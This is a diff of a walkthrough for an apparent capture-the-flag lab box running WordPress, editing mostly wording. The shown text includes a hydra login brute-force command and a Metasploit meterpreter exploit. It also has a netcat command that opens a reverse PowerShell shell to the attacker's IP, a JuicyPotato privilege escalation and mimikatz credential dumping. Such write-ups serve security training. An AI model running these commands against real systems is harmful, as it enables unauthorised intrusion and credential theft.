@@ -30,7 +30,7 @@ A wordpress site. If we browse to it belongs to a electric car manufacturer name
 
 ![user-pass](assets/markdown-img-paste-20210816120702703.png)
 
-I've put together a list of usernames and passwords previously encountered in the series, removing service accounts such as www-data and postgres. It's 24 combinations lets use hydra to make it go quicker. The site responses differently if the user exists or not so I've previously save a command to quickly fuzz usernames. It goes:
+I've put together a list of usernames and passwords previously encountered in the series, removing service accounts such as www-data and postgres. It's 24 combinations so lets use hydra to make it go quicker. The site responses differently if the user exists or not so I've previously put togheter a command to quickly fuzz usernames. It goes:
 ```
 hydra -L users.txt -p test 10.10.10.29 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=Invalid username."
 ```
@@ -56,6 +56,7 @@ Fire up msfconsole and search for 'wp admin'.
 ![wp-admin-search](assets/markdown-img-paste-20210816122731895.png)
 
 **Useful msfconsole commands**
+
 `search <term>` - make a search
 `use <nr/name>` - use that exploit
 `info` - show info about current exploit, you can see the options you have to set here
@@ -64,7 +65,7 @@ Fire up msfconsole and search for 'wp admin'.
 
 ![meterpreter](assets/markdown-img-paste-20210816123354267.png)
 
-*If the exploit runs and fails to get a meterpreter, try to set the LHOST option to your tunnel IP, it might point to the wrong IP default.*
+*If the exploit runs and fails to get a meterpreter, try to set the LHOST option to your tunnel IP, as it might default to something else.*
 
 **Useful meterpreter commands**
 ```
@@ -82,7 +83,11 @@ shell
 
 The shell seems to hang for me every time I send a command, not sure if intended from the box creator or just a temporary bug.
 
-I tried som different shells, with pretty much the same results. You can use it to enumerate the file system at least. For example you can see that the user folder contains a new user, sandra. Let's try to get a proper shell to continue enum and find a privesc. In the wordpress wp-content folder there's a folder called uploads, I uploaded nc.exe(`/usr/share/windows-resources/binaries/`) and executed it with meterpreter: `execute -f nc.exe -a "-e powershell 10.10.16.96 4242"` *(I changed the name of nc to myownnc.exe due many others doing the same thing with nc.exe)*
+I tried som different shells, with pretty much the same results. You can use it to enumerate the file system at least. For example you can see that the user folder contains a new user, sandra. Let's try to get a proper shell to continue enum and find a privesc. In the wordpress wp-content folder there's a folder called uploads, I uploaded nc.exe(`/usr/share/windows-resources/binaries/` in kali) and executed it with meterpreter:
+
+`execute -f nc.exe -a "-e powershell 10.10.16.96 4242"`
+
+*(I changed the name of nc to myownnc.exe due many other users doing the same thing with nc.exe)*
 
 ![sysinfo](assets/markdown-img-paste-20210817131013890.png)
 
@@ -95,7 +100,7 @@ Ref: https://github.com/ohpe/juicy-potato
 From the meterpreter, upload the JuicyPotato.exe and a bat file containing the command to start a reverse powershell with netcat(same as we did before, but this time it will be run as system account).
 
 
-*I've renamed my files to not mix them with others doing the same thing. jpjp.exe is the JuicyPotato.exe*
+*I've renamed my files to not mix them with other users doing the same thing. jpjp.exe is the JuicyPotato.exe*
 
 
 ![jpjpexe](assets/markdown-img-paste-2021081713384024.png)
@@ -104,6 +109,6 @@ From the meterpreter, upload the JuicyPotato.exe and a bat file containing the c
 ## Post expliotation
 Ref: https://github.com/gentilkiwi/mimikatz
 
-We can use mimikatz and `sekurlsa::logonpasswords` to dump password hashes.
+We can use mimikatz and `sekurlsa::logonpasswords` to dump passwords.
 
 ![sandra](assets/markdown-img-paste-20210817135802388.png)
